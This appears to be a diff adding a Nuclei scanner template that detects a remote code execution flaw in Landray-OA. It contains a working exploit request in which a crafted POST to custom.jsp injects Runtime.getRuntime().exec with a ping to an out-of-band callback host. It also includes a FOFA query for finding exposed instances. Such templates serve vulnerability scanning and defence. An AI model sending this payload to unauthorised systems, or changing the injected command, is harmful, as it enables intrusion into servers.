@@ -1,0 +1,48 @@
+id: landray-oa-erp-data-rce
+
+info:
+  name: Landray-OA - Remote Code Execution
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Landray-OA `erp_data.jsp` is vulnerable to remote code execution vulnerability.
+  reference:
+    - https://cn-sec.com/archives/1249492.html
+    - https://github.com/ax1sX/SecurityList/blob/main/Java_OA/LandrayEkpAudit.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="Landray-OA系统"
+  tags: landray,rce
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        var={"body":{"file":"/tic/core/resource/js/erp_data.jsp"}}&erpServcieName=sysFormulaValidate&script=Runtime.getRuntime().exec("ping -c 4 {{interactsh-url}}");
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: body
+        words:
+          - '{"message":"'
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a00473045022010e9d3b9872f58099fb45b64a681b0018eda56cf0eba9c4dbf36f3c9504f284102210084edf719a0a1837dac6df7bda489958734df22cbdd4b28c6c1d4c5ed2380db8b:922c64590222798bb761d5b6d8e72950
